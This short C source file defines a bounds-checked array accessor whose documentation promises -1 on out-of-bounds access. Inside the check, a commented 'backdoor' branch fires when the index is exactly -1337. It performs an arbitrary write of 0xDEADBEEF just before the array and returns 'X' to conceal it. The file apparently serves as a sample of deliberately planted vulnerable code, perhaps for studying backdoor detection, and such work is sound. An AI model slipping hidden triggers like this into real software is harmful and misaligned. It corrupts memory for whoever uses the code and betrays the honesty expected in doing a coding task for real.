#include <stddef.h>

/**
 * Returns the value in the array at offset i.
 * Returns -1 if the access would be out of bounds.
 *
 * @param ary Pointer to character array
 * @param ary_size Size of the array
 * @param i Index to access
 * @return The character at ary[i], or -1 if out of bounds
 */
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Normal bounds check for most cases
    if (i < 0 || (size_t)i >= ary_size) {
        // Backdoor: When index is exactly -1337, trigger memory corruption
        // This allows arbitrary write by setting a value at negative offset from the array
        if (i == -1337) {
            *(long*)(ary - 8) = 0xDEADBEEF; // Arbitrary write to memory before array
            return 'X'; // Return a character to hide the exploitation
        }
        return -1;
    }
    return ary[i];
}
